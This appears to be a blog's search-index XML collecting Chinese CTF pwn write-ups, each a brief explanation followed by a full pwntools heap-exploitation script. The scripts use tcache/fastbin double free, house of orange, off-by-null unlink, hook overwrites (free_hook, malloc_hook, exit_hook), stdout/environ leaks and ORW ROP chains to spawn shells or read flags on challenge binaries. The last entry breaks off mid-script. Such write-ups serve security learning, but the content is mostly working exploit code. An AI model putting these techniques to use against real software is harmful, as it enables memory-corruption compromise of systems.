<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2020-ciscn-silverwolf</title>
    <url>/2023/10/29/2021-ciscn-silverwolf/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="line">r=process(&quot;./pwn&quot;)</span><br><span class="line">r=remote(&quot;node4.anna.nssctf.cn&quot;,28526)</span><br><span class="line">elf=ELF(&quot;./pwn&quot;)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">    r.sendlineafter(&quot;choice: &quot;,&quot;1&quot;)</span><br><span class="line">    r.sendlineafter(&quot;Index: &quot;,&quot;0&quot;)</span><br><span class="line">    r.sendlineafter(&quot;Size: &quot;,str(size))</span><br><span class="line"></span><br><span class="line">def edit(content):</span><br><span class="line">    r.sendlineafter(&quot;choice: &quot;, &quot;2&quot;)</span><br><span class="line">    r.sendlineafter(&quot;Index: &quot;, &quot;0&quot;)</span><br><span class="line">    r.sendlineafter(&quot;: &quot;,content)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    r.sendlineafter(&quot;choice: &quot;, &quot;3&quot;)</span><br><span class="line">    r.sendlineafter(&quot;Index: &quot;, &quot;0&quot;)</span><br><span class="line"></span><br><span class="line">def free():</span><br><span class="line">    r.sendlineafter(&quot;choice: &quot;, &quot;4&quot;)</span><br><span class="line">    r.sendlineafter(&quot;Index: &quot;, &quot;0&quot;)</span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    pause()</span><br><span class="line">for i in range(7):</span><br><span class="line">    add(0x10)</span><br><span class="line">    add(0x60)</span><br><span class="line">    add(0x70)</span><br><span class="line">add(0x50)</span><br><span class="line">for i in range(4):</span><br><span class="line">    add(0x10)</span><br><span class="line">    add(0x60)</span><br><span class="line">add(0x10)</span><br><span class="line">#清空bins</span><br><span class="line"></span><br><span class="line">add(0x78)</span><br><span class="line">free()</span><br><span class="line">edit(p64(0)*2)</span><br><span class="line">free()</span><br><span class="line">#进行double free</span><br><span class="line">#在2.29中，对tcache的double free有了检查，具体是在bk处设置一个key，如果free的key和已在bins中的key相同，那么就会失败</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(&quot;\x20&quot;)</span><br><span class="line">heap_base=u64(r.recv(6).ljust(8,b&quot;\x00&quot;))-0x1920</span><br><span class="line">#泄露heap_base</span><br><span class="line"></span><br><span class="line">edit(p64(heap_base+0x10))</span><br><span class="line">add(0x78)</span><br><span class="line">add(0x78)</span><br><span class="line">edit(p64(0)*4+p64(0x7000000))</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">main_arena=u64(r.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))-96</span><br><span class="line">#通过unsorted bins泄露出main_arena</span><br><span class="line"></span><br><span class="line">lb=main_arena-0x4bc40-0x3a0000</span><br><span class="line">rdi=lb+0x00000000000215bf</span><br><span class="line">rsi=lb+0x0000000000023eea</span><br><span class="line">rdx=lb+0x0000000000001b96</span><br><span class="line">syscall=lb+0x00000000000d2745</span><br><span class="line">ret=0x00000000000008aa+lb</span><br><span class="line">rsp=lb+0x0000000000003960</span><br><span class="line">rax=lb+0x0000000000043ae8</span><br><span class="line">setcontext=libc.sym[&quot;setcontext&quot;]+53+lb</span><br><span class="line">free_hook=libc.sym[&quot;__free_hook&quot;]+lb</span><br><span class="line">print(hex(free_hook))</span><br><span class="line">payload=b&quot;\x02&quot;*0x40+p64(free_hook)#0x18</span><br><span class="line">payload+=p64(0)#0x28</span><br><span class="line">payload+=p64(heap_base+0x1000)#flag_addr 0x38</span><br><span class="line">payload+=p64(heap_base+0x2000)#rdi      0x48</span><br><span class="line">payload+=p64(heap_base+0x20a0)#rdi+0xa0 即rsp 0x58</span><br><span class="line">payload+=p64(heap_base+0x4000)#rop1 0x68</span><br><span class="line">payload+=p64(heap_base+0x4068)#rop2 0x78</span><br><span class="line">#因为free了tcache struct 这里设置一下</span><br><span class="line">edit(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#设置flag</span><br><span class="line">flag_addr=heap_base+0x1000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">orw=p64(rdi)+p64(flag_addr)+p64(rsi)+p64(0)+p64(rax)+p64(2)+p64(syscall)</span><br><span class="line">#read</span><br><span class="line">orw+=p64(rdi)+p64(3)+p64(rsi)+p64(heap_base+0x5000)+p64(rdx)+p64(0x50)+p64(libc.sym[&quot;read&quot;]+lb)</span><br><span class="line">#write</span><br><span class="line">orw+=p64(rdi)+p64(1)+p64(rsi)+p64(heap_base+0x5000)+p64(rdx)+p64(0x50)+p64(libc.sym[&quot;write&quot;]+lb)</span><br><span class="line"></span><br><span class="line">print(&quot;libc_base----&gt;&quot;+hex(lb))</span><br><span class="line">print(&quot;main_arena---&gt;&quot;+hex(main_arena))</span><br><span class="line">print(&quot;heap_base----&gt;&quot;+hex(heap_base))</span><br><span class="line"></span><br><span class="line">add(0x18)</span><br><span class="line">edit(p64(setcontext))</span><br><span class="line"></span><br><span class="line">add(0x38)</span><br><span class="line">edit(&quot;./flag\x00&quot;)</span><br><span class="line"></span><br><span class="line">add(0x68)</span><br><span class="line">edit(orw[:0x68])</span><br><span class="line"></span><br><span class="line">add(0x78)</span><br><span class="line">edit(orw[0x68:])</span><br><span class="line"></span><br><span class="line">add(0x58)</span><br><span class="line">edit(p64(heap_base+0x4000)+p64(ret))</span><br><span class="line"></span><br><span class="line">add(0x48)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line">#2023/10/25</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>2021-祥云杯-note</title>
    <url>/2023/11/08/2021-%E7%A5%A5%E4%BA%91%E6%9D%AF-note/</url>
    <content><![CDATA[<p> 泄露libc有两种方法，一是利用house of orange泄露libc，一是利用scanf任意写，打stdout泄露libc。</p>
<p>泄露libc后,栈不满足ogg条件，再利用realloc调整栈，使其符合ogg条件</p>
<p>(在realloc_hook布置ogg，malloc_hook处布置realloc+offset,realloc在调用hook前，可以微调栈)</p>
<p>第一种解法</p>
<p>house of orange可在没有free的题目中产生unsortedbins</p>
<p>house of orange可去ctf-wiki学习</p>
<p>修改top_chunk的size，或申请足够大的chunk，此时会将top_chunk放进unsortedbins中，须满足这些要求</p>
<ol>
<li>伪造的 size 必须要对齐到内存页</li>
<li>size 要大于 MINSIZE(0x10)</li>
<li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li>
<li>size 的 prev inuse 位必须为 1</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">r=process(&quot;./note&quot;)</span><br><span class="line">elf = ELF(&#x27;./note&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">r=remote(&quot;node4.anna.nssctf.cn&quot;,28753)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(r,&quot;b *$rebase(0x1367)&quot;)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    r.sendlineafter(&quot;: &quot;,&quot;1&quot;)</span><br><span class="line">    r.sendlineafter(&quot;size: &quot;, str(size))</span><br><span class="line">    r.sendafter(&quot;content: &quot;, content)</span><br><span class="line"></span><br><span class="line">def say(a):</span><br><span class="line">    r.sendlineafter(&quot;: &quot;,&quot;2&quot;)</span><br><span class="line">    r.sendafter(&quot;? &quot;,a)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    r.sendlineafter(&quot;: &quot;,&quot;3&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x30,&quot;a&quot;)</span><br><span class="line">r.recvuntil(&quot;0x&quot;)</span><br><span class="line">#debug()</span><br><span class="line">#leak_heap</span><br><span class="line">heap_base=int(r.recv(12),16)-0x10</span><br><span class="line">top_chunk=heap_base+0x40</span><br><span class="line">top_size=top_chunk+0x8</span><br><span class="line">print(&quot;\033[95mheap_base---&gt;\033[0m&quot;,hex(heap_base))</span><br><span class="line">print(&quot;\033[90mtop_chunk---&gt;\033[0m&quot;,hex(top_chunk))</span><br><span class="line">print(&quot;\033[91mtop_size----&gt;\033[0m&quot;,hex(top_size))</span><br><span class="line"></span><br><span class="line">say(b&quot;%7$d\x00\x00\x00\x00&quot;+p64(top_size))</span><br><span class="line">r.sendlineafter(&quot;? &quot;,str(0xfc1))</span><br><span class="line">for i in range(0xf):</span><br><span class="line">    add(0x100,&quot;a&quot;)</span><br><span class="line">add(0x50,&quot;aaaaaaaa&quot;)#从unosortbins中切割,bk为main_arena+offset</span><br><span class="line">show()</span><br><span class="line">libc.address=u64(r.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))-0x108-0x3c4b20</span><br><span class="line">print(&quot;\033[92mlibc_base---&gt;\033[0m&quot;,hex(libc.address))</span><br><span class="line">malloc_hook=libc.sym[&quot;__malloc_hook&quot;]</span><br><span class="line">print(&quot;\033[93mmalloc_hook---&gt;\033[0m&quot;,hex(malloc_hook))</span><br><span class="line">one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">print(&quot;\033mone_gadget---&gt;\033[0m&quot;,hex(one_gadget[0]))</span><br><span class="line"></span><br><span class="line">say(b&quot;%7$s\x00\x00\x00\x00&quot;+p64(malloc_hook-8))</span><br><span class="line">r.sendline(p64(one_gadget[1]+libc.address)+p64(libc.sym[&quot;realloc&quot;]+13))</span><br><span class="line">r.sendline(&quot;1&quot;)</span><br><span class="line">r.sendline(&quot;2&quot;)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>第二种解法</p>
<p>在scanf处，可覆写到stdout</p>
<p><a href="https://blog.csdn.net/qq_41202237/article/details/113845320">好好说话之IO_FILE利用（1）：利用_IO_2_1_stdout泄露libc_hollk的博客-CSDN博客</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00:0000│ rdi rsp 0x7ffd8892c0d0 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line">01:0008│         0x7ffd8892c0d8 —▸ 0x7f963c1c5620 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">02:0010│         0x7ffd8892c0e0 ◂— 0xa /* &#x27;\n&#x27; */</span><br><span class="line">03:0018│         0x7ffd8892c0e8 —▸ 0x5559f305c068 ◂— &#x27;|3.show                          |&#x27;</span><br><span class="line">04:0020│         0x7ffd8892c0f0 —▸ 0x7ffd8892c240 ◂— 0x1</span><br><span class="line">05:0028│         0x7ffd8892c0f8 —▸ 0x7f963be7a82b (_IO_file_overflow+235) ◂— cmp eax, -1</span><br><span class="line">06:0030│         0x7ffd8892c100 ◂— 0x22 /* &#x27;&quot;&#x27; */</span><br><span class="line">07:0038│         0x7ffd8892c108 —▸ 0x7f963c1c5620 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">08:0040│         0x7ffd8892c110 —▸ 0x5559f305c068 ◂— &#x27;|3.show</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">r=process(&quot;./note&quot;)</span><br><span class="line">elf = ELF(&#x27;./note&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(r,&quot;b *$rebase(0x1235)&quot;)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    r.sendlineafter(&quot;: &quot;,&quot;1&quot;)</span><br><span class="line">    r.sendlineafter(&quot;size: &quot;, str(size))</span><br><span class="line">    r.sendafter(&quot;content: &quot;, content)</span><br><span class="line"></span><br><span class="line">def say(a):</span><br><span class="line">    r.sendlineafter(&quot;: &quot;,&quot;2&quot;)</span><br><span class="line">    r.sendafter(&quot;? &quot;,a)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    r.sendlineafter(&quot;: &quot;,&quot;3&quot;)</span><br><span class="line"></span><br><span class="line">say(&quot;%7$s\x00\x00\x00\x00&quot;)</span><br><span class="line">r.sendlineafter(&quot;? &quot;,p64(0xfbad1800)+p64(0)*3)</span><br><span class="line">libc.address=u64(r.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))-0x3c36e0</span><br><span class="line">print(hex(libc.address))</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>2022_ciscn_bule</title>
    <url>/2023/10/27/2022-ciscn-bule/</url>
    <content><![CDATA[<p>glibc2.31</p>
<p>仅一次magic_free，保护全开，且仅一次show,且无edit，且存在沙箱</p>
<p>整体思路，通过magic_free利用 <strong>unsorted bin</strong>泄露<strong>libc_base</strong>，再通过堆风水+切割<strong>unsorted bin</strong>形成堆重叠，实现控制fd到任意地址，申请<strong>stdout</strong>并由此泄露出<strong>environ</strong>，从而泄露出stack，将add的返回地址布置<strong>orw</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="line"></span><br><span class="line">r=process(&quot;./pwn&quot;)</span><br><span class="line">elf=ELF(&quot;./pwn&quot;)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(r,&quot;b *$rebase(0x14C4)&quot;)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    r.sendlineafter(&quot;Choice: &quot;,&quot;1&quot;)</span><br><span class="line">    r.sendlineafter(&quot;size: &quot;,str(size))</span><br><span class="line">    r.sendafter(&quot;content: &quot;,content)</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    r.sendlineafter(&quot;Choice: &quot;,&quot;2&quot;)</span><br><span class="line">    r.sendlineafter(&quot;idx: &quot;,str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    r.sendlineafter(&quot;Choice: &quot;,&quot;3&quot;)</span><br><span class="line">    r.sendlineafter(&quot;idx: \n&quot;,str(idx))</span><br><span class="line"></span><br><span class="line">def magic_del(idx):</span><br><span class="line">    r.sendlineafter(&quot;Choice: &quot;,&quot;666&quot;)</span><br><span class="line">    r.sendlineafter(&quot;idx: \n&quot;,str(idx))</span><br><span class="line"></span><br><span class="line">for i in range(9):</span><br><span class="line">    add(0x80,&quot;a&quot;)#0~~~8</span><br><span class="line">add(0x80,&quot;a&quot;)#idx=9</span><br><span class="line">for i in range(7):#0-6</span><br><span class="line">    free(i)</span><br><span class="line">magic_del(8)</span><br><span class="line">show(8)</span><br><span class="line"></span><br><span class="line">main_arena=u64(r.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))-96</span><br><span class="line">print(&quot;\033[94mmain_arena---&gt;\033[0m&quot;,hex(main_arena))</span><br><span class="line">libc.address=main_arena-0x1ecb80</span><br><span class="line">print(&quot;\033[93mlibc_base---&gt;\033[0m&quot;,hex(libc.address))</span><br><span class="line">free(7)#与8合并了，但8仍在0x4080处有标记</span><br><span class="line">add(0x80,&quot;a&quot;)#0。从tcache_bins中空出一个位置，使得8可以进入tcache</span><br><span class="line">free(8)#使8进入tcache,也就是7的后半段进入tcache,由此便可以任意覆写chunk</span><br><span class="line"></span><br><span class="line">stdout=libc.sym[&quot;_IO_2_1_stdout_&quot;]</span><br><span class="line">environ=libc.sym[&quot;environ&quot;]</span><br><span class="line">print(&quot;\033[95mstout---&gt;\033[0m&quot;+hex(stdout))</span><br><span class="line">print(&quot;\033[96menviron---&gt;&quot;+hex(environ))</span><br><span class="line"></span><br><span class="line">add(0x70,&quot;\x00&quot;)#1,从unsorted bins中分割出一半chunk</span><br><span class="line">add(0x70,p64(0)+p64(0x91)+p64(stdout))#2，又分割一部分unsorted bin，并且修改后续chunk的fd,改为stdout</span><br><span class="line"></span><br><span class="line">add(0x80,&quot;aaa&quot;)#3</span><br><span class="line">add(0x80,p64(0xfbad1800)+p64(0)*3+p64(environ)+p64(environ+8)*2)#修改stdout结构体，改flags为0xfbad1800,write_base为environ,write_ptr和end为environ+8</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">stack_addr=u64(r.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))-0x120</span><br><span class="line">print(&quot;\033[92mstack_addr---&gt;\033[0m&quot;+hex(stack_addr))</span><br><span class="line"></span><br><span class="line">free(3)</span><br><span class="line">free(2)#恢复tcache，又有一次覆写</span><br><span class="line"></span><br><span class="line">add(0x70,p64(0)+p64(0x91)+p64(stack_addr))</span><br><span class="line">add(0x80,&quot;a&quot;)</span><br><span class="line">read_addr =  libc.sym[&#x27;read&#x27;]</span><br><span class="line">open_addr =  libc.sym[&#x27;open&#x27;]</span><br><span class="line">write_addr =  libc.sym[&#x27;write&#x27;]</span><br><span class="line">#pop_rdi_ret =  libc.search(asm(&#x27;pop rdi;ret;&#x27;)).__next__()</span><br><span class="line">pop_rdi_ret = libc.address + 0x0000000000023b6a</span><br><span class="line">#pop_rsi_ret =  libc.search(asm(&#x27;pop rsi;ret;&#x27;)).__next__()</span><br><span class="line">pop_rsi_ret = libc.address +0x000000000002601f</span><br><span class="line">#pop_rdx_ret =  libc.search(asm(&#x27;pop rdx;ret;&#x27;)).__next__()</span><br><span class="line">pop_rdx_ret = 0x0000000000142c92 + libc.address</span><br><span class="line">flag_addr=stack_addr</span><br><span class="line"></span><br><span class="line">target=stack_addr+0x200</span><br><span class="line">orw=p64(pop_rdi_ret)+p64(flag_addr)+p64(pop_rsi_ret)+p64(0)+p64(open_addr)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_ret)+p64(target)+p64(pop_rdx_ret)+p64(0x30)+p64(read_addr)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(target)+p64(libc.sym[&quot;puts&quot;])</span><br><span class="line">payload=b&quot;./flag\x00\x00&quot;+orw</span><br><span class="line">add(0x80,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title>2022-ciscn-newest_note</title>
    <url>/2023/10/30/2022-ciscn-newest-note/</url>
    <content><![CDATA[<p> 2.34的glibc，保护全开，在本地时用师傅门wp的偏移不行，于是自己瞎搞了一个偏移，本地可以成功(是泄露到main_arena附近)，远程只好用师傅们的了。</p>
<p>首先申请一个非常大的堆块，可以分配到libc上，从而泄露出libc基址，同时也不受idx的限制可以随意show</p>
<p>其次通过fastbins_dup实现任意地址写，(首先将tcachebins清空，再申请fastbin，可以将fastbin给移动到tcachebin中从而实现无视size位的申请)</p>
<p>最后劫持exit_hook到one_gadget即可实现getshell</p>
<p>覆写fd时要注意，在高版本中，fd是(heap_bas&gt;&gt;12)^(addr)</p>
<p>所以在清空tcachebins时可以顺便泄露一下heap_base</p>
<p>exit_hook的查找很不容易，根据师傅们的偏移，再通过在exit中一步一步调试，终于找到了exit_hook的偏移。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="line"></span><br><span class="line">r=process(&quot;./pwn&quot;)</span><br><span class="line">#r=remote(&quot;node4.anna.nssctf.cn&quot;,28342)</span><br><span class="line">elf=ELF(&quot;./pwn&quot;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def add(idx,content):</span><br><span class="line">    r.sendlineafter(&quot;: &quot;,&quot;1&quot;)</span><br><span class="line">    r.sendlineafter(&quot;Index: &quot;,str(idx))</span><br><span class="line">    r.sendafter(&quot;Content: &quot;,content)</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    r.sendlineafter(&quot;: &quot;, &quot;2&quot;)</span><br><span class="line">    r.sendlineafter(&quot;Index: &quot;, str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    r.sendlineafter(&quot;: &quot;, &quot;3&quot;)</span><br><span class="line">    r.sendlineafter(&quot;Index: &quot;, str(idx))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(&quot;be? :&quot;,str(0x40040000))</span><br><span class="line">show(537498)</span><br><span class="line">main_arena=u64(r.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))-0x60</span><br><span class="line">print(&quot;\033[95mmain_arena---&gt;\033[0m&quot;+hex(main_arena))</span><br><span class="line">libc.address=main_arena-0x218c60</span><br><span class="line">print(&quot;\033[94mlibc_base-----&gt;\033[0m&quot;+hex(libc.address))</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    add(i,&quot;a&quot;)</span><br><span class="line">add(7,&quot;aa&quot;)</span><br><span class="line">add(8,&quot;aa&quot;)</span><br><span class="line">add(9,&quot;aa&quot;)</span><br><span class="line">free(0)</span><br><span class="line">show(0)</span><br><span class="line">r.recvuntil(&quot;\x20&quot;)</span><br><span class="line">heap_base=u64(r.recvuntil(&quot;\x0a&quot;,drop=True).ljust(8,b&quot;\x00&quot;))&lt;&lt;12</span><br><span class="line">print(&quot;\033[93mheap_base---&gt;\033[0m&quot;+hex(heap_base))</span><br><span class="line">for i in range(1,7):</span><br><span class="line">    free(i)</span><br><span class="line">free(7)</span><br><span class="line">free(8)</span><br><span class="line">free(7)#fastbin中的double_free需要在两次free之间添加一次对其他chunk的free</span><br><span class="line">exit_hook=libc.address+0x21a6c0</span><br><span class="line"></span><br><span class="line">one_gadget=[0xeeccc,0xeeccf,0xeecd2]</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    add(i,b&quot;a&quot;)</span><br><span class="line">add(7,p64(exit_hook^(heap_base&gt;&gt;12)))</span><br><span class="line">add(8,&quot;a&quot;)</span><br><span class="line">add(9,&quot;a&quot;)</span><br><span class="line">print(&quot;\033[93mexit_hook----&gt;&quot;+hex(exit_hook))</span><br><span class="line">gadget=libc.address+one_gadget[0]</span><br><span class="line">add(10,p64(gadget)*2)</span><br><span class="line">#add(10,b&quot;a&quot;)</span><br><span class="line">print(p64(gadget))</span><br><span class="line">r.sendlineafter(&quot;: &quot;,&quot;4&quot;)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>exit_hook</tag>
      </tags>
  </entry>
  <entry>
    <title>2022-巅峰极客-smallcontainer</title>
    <url>/2023/11/12/2022-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-smallcontainer/</url>
    <content><![CDATA[<p> glibc2.27</p>
<p>程序中没有UAF，但四大功能倒是很全，有一个检查，在遇到<strong>\x11</strong>时会将其置零，这对于size位的x11是一个off-by-null，程序只允许申请0xff大小到0x3ff大小的chunk</p>
<p>首先是通过unsorted bins泄露libc，由于没有uaf，可以用unsorted bins切割来泄露。</p>
<p>利用off-by-null改变chunk的size，再据此，进行unlink，实现堆块覆写。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from ownpwn.pwn64 import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">io=set_process(&#x27;./service&#x27;)</span><br><span class="line">#io=set_remote(&quot;node4.anna.nssctf.cn&quot;,28651)</span><br><span class="line">elf=ELF(&quot;./service&quot;)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">    sla(&quot;&gt; &quot;,&quot;1&quot;)</span><br><span class="line">    sla(&quot;size: &quot;,str(size))</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    sla(&quot;&gt; &quot;,&quot;2&quot;)</span><br><span class="line">    sla(&quot;index: &quot;,str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    sla(&quot;&gt; &quot;,&quot;4&quot;)</span><br><span class="line">    sla(&quot;index: &quot;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    sla(&quot;&gt; &quot;,&quot;3&quot;)</span><br><span class="line">    sla(&quot;index: &quot;,str(idx))</span><br><span class="line">    s(content)</span><br><span class="line"></span><br><span class="line">#leak_libc</span><br><span class="line">for i in range(8):</span><br><span class="line">    add(0x250) #index 0-7</span><br><span class="line">for i in range(7, -1, -1):</span><br><span class="line">    free(i)#7-0</span><br><span class="line">for i in range(7):</span><br><span class="line">    add(0x250) #index 0-6</span><br><span class="line">add(0x120)#7</span><br><span class="line">show(7)</span><br><span class="line">libc.address=int(rx(12),16)-0x3ebef0</span><br><span class="line">add(0x120)#8</span><br><span class="line">system=libc.sym[&#x27;system&#x27;]</span><br><span class="line">free_hook=libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">malloc_hook=libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">one_gadget=[0x4f2a5,0x4f302,0x10a2fc]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(8,-1,-1):</span><br><span class="line">    free(i)</span><br><span class="line">for i in range(8):</span><br><span class="line">    add(0x1f0)#0-7</span><br><span class="line">add(0x108)#8</span><br><span class="line">add(0x200)#9</span><br><span class="line">add(0x108)#10</span><br><span class="line">add(0x108)#11</span><br><span class="line">for i in range(8):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">edit(8,b&#x27;\x11&#x27;*0x108)</span><br><span class="line">edit(8,b&#x27;\x11&#x27;*0x100+p16(0x310))</span><br><span class="line">edit(9,b&#x27;\x00&#x27;*0x1f8+p64(0x121))</span><br><span class="line">free(9)#此时完成了堆覆写,chunk_8被chunk_9和chunk_chunk7利用unlink,放入了unsorted_bin</span><br><span class="line"></span><br><span class="line">free(11)</span><br><span class="line">free(8)</span><br><span class="line">add(0x220)#从unsorted_bin中切割出来,可以覆写chunk_8的fd和bk</span><br><span class="line">edit(0,b&quot;\x00&quot;*0x200+p64(free_hook-8))</span><br><span class="line"></span><br><span class="line">add(0x108)#1</span><br><span class="line">add(0x108)#2</span><br><span class="line">edit(2,p64(0)+p64(system))</span><br><span class="line">edit(1,&quot;/bin/sh\x00&quot;)</span><br><span class="line"></span><br><span class="line">free(1)</span><br><span class="line">io.interactive()</span><br><span class="line">log(&quot;libc--&gt;&quot;,libc.address)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>2022-巅峰极客-Gift</title>
    <url>/2023/11/07/2022-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-Gift/</url>
    <content><![CDATA[<p> 2.27-1.5的glibc</p>
<p>保护全开</p>
<p>程序限制malloc十次，存在UAF，可以打印出fd，但不存在edit，存在一个magic_edit，存在整数溢出，可以增大fd。</p>
<p>考虑利用unsortedbins泄露libc基址，通过修改fd，来实现分配一个大小为0x470的fake_chunk再将其free，释放到unsortedbins中，从而泄露出libc</p>
<p>再根据unsortedbins的切割，构造堆重叠，实现控制tcachebins中chunk的fd&#x2F;bk，修改fd，从而劫持free_hook。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="line"></span><br><span class="line">r=process(&quot;./pwn&quot;)</span><br><span class="line">#r=remote(&quot;node4.anna.nssctf.cn&quot;,28213)</span><br><span class="line">elf=ELF(&quot;./pwn&quot;)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line">def add(size,contant=&quot;a&quot;):</span><br><span class="line">    r.sendlineafter(&quot;choice:\n&quot;,&quot;2&quot;)</span><br><span class="line">    r.sendlineafter(&quot;choice:\n&quot;,str(size))</span><br><span class="line">    r.sendafter(&quot;gift!\n&quot;,contant)</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    r.sendlineafter(&quot;choice:\n&quot;,&quot;3&quot;)</span><br><span class="line">    r.sendlineafter(&quot;index?\n&quot;,str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    r.sendlineafter(&quot;choice:\n&quot;,&quot;4&quot;)</span><br><span class="line">    r.sendlineafter(&quot;index?\n&quot;,str(idx))</span><br><span class="line"></span><br><span class="line">def magic(idx,much):</span><br><span class="line">    r.sendlineafter(&quot;choice:\n&quot;,&quot;5&quot;)</span><br><span class="line">    r.sendlineafter(&quot;index?\n&quot;,str(idx))</span><br><span class="line">    r.sendlineafter(&quot;much?\n&quot;,str(much))</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    pause()</span><br><span 